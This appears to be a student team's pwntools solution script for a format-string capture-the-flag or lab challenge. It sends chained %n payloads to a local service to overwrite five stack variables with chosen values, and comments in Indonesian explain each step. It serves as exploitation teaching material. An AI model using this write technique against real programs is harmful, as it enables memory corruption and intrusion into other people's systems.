'''
- Immanuel - 2006463162
- Pradipta Davi Valendra - 2006462664
- Tara Mazaya Lababan - 2006473535

Penjelasan:
Payload berupa format string yang akan mengubah nilai variabel pada stack. 
Diurutkan berdasarkan nilai variable terkecil hingga terbesar.
'''
from pwn import *

BINARY = ['./chall']
IP, PORT = 'localhost', 7777

p = remote(IP, PORT)

payload = b'%10c%4$n' # ----> nilai variabel (d) akan diubah menjadi 10
payload += b'%1$5c%5$n'  # ----> nilai variabel (e) akan diubah menjadi 10 + 5 = 15
payload += b'%1$15c%2$n' # ----> nilai variabel (b) akan diubah menjadi 15 + 15 = 30
payload += b'%1$15c%1$n' # ----> nilai variabel (a) akan diubah menjadi 30 + 15 = 45
payload += b'A%3$n'  # ----> nilai variabel (c) akan diubah menjadi 45 + 1 = 46

p.sendline(payload)
sleep(1)
print(p.recv().decode(errors='ignore'))
